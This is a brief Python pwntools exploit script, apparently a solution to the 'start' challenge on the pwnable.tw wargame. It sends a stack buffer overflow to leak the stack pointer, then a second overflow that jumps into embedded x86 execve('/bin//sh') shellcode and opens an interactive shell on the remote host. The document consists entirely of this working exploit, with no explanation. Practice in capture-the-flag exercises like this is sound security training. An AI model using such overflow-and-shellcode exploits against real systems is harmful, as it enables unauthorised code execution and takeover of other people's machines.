from pwn import *

p = process('./start')
p = remote("chall.pwnable.tw", 10000)

shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    b"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

p.recv()

bof1 = b"A" * 20 + p32(0x8048087)
p.send(bof1)

leak = p.recv(4)
leak_esp = u32(leak)

bof2 = b"A" * 20 + p32(leak_esp + 20) + shellcode
p.send(bof2)
p.interactive()
